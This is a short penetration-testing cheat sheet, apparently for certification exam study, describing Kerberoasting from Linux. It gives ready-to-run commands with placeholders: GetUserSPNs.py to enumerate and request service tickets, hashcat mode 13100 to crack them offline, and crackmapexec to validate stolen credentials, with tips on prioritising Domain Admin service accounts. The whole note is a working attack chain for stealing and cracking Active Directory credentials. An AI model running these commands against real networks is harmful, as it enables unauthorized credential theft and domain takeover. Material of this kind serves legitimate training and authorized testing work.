# Kerberoasting — Linux

Any domain user can request a TGS for any SPN account. Ticket is encrypted with the service account's NTLM hash → crack offline → cleartext. Service accounts are often DA members or local admin on many hosts.

Check SPN accounts and their group memberships before requesting — prioritize DA members and privileged groups:

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```

Request all TGS tickets at once, save to file:

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile <OUTFILE>
```

Target a specific account only:

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile <OUTFILE>
```

Crack TGS tickets — mode 13100 (`$krb5tgs$23$`):

```bash
hashcat -m 13100 <OUTFILE> <WORDLIST>
```

Validate cracked creds immediately:

```bash
sudo crackmapexec smb <DC_IP> -u <USER> -p <PASS>
```

> [!tip] `MemberOf` column in GetUserSPNs output is the priority signal. DA member SPN + weak password = game over. Check `PasswordLastSet` too — old = likely weak/reused.

> [!warning] TGS tickets (`$krb5tgs$23$`) crack much slower than NTLM. Don't waste exam time cracking service accounts that aren't in privileged groups. Triage first.

Got cleartext → validate with CME → check for local admin across subnet if it's a svc account.



























